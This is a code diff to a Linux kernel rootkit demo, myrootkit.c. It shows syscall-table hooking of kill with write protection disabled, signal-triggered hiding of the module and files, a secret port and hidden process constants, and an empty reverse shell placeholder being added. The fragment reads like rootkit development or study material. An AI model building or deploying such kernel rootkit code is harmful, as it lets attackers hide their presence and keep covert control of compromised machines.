@@ -27,8 +27,11 @@ File: myrootkit.c
 # include <net/tcp.h> 
 // PDE_DATA
 # include <linux/proc_fs.h>
-//__task_cred
-#include <linux/cred.h>
+// __task_cred
+# include <linux/cred.h>
+//socket
+# include <linux/net.h>
+
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Mote");
@@ -40,7 +43,6 @@ MODULE_DESCRIPTION("A Simple LKM Rootkit Demo");
 # define SECRET_FILE "Hidden_"
 # define PROC_PATH "/proc"
 # define SECRET_PROC 8123
-
 # define SECRET_PORT 10000
 
 
@@ -573,6 +575,12 @@ static void create_files(void)
 //========== END CREATE FILE =================
 
 
+//========== REVERSESHELL =================
+
+
+//========== END REVERSESHELL =================
+
+
 //========== KILL HOOK =================
 /**
 kill钩子
@@ -603,7 +611,7 @@ asmlinkage int fake_kill(pid_t pid, int sig){
         case SIGUNHIDEMODULE:
             module_show();
             break;
-        case SIGHIDEFILE: // 控制文件隐藏显示
+        case SIGHIDEFILE:
             hide_file_start();
             break;
         case SIGUNHIDEFILE:
@@ -654,7 +662,6 @@ hook_start(void)
     disable_wp();
     HOOK_SCT(sct, kill);
     enable_wp();
-    //pr_info("%s\n", "Hook Start!");
 }
 
 
@@ -664,7 +671,6 @@ hook_stop(void)
     disable_wp();
     UNHOOK_SCT(sct, kill);
     enable_wp();
-    //pr_info("%s\n", "Hook Stop!");
 }
 
 //========== END KILL HOOK =================
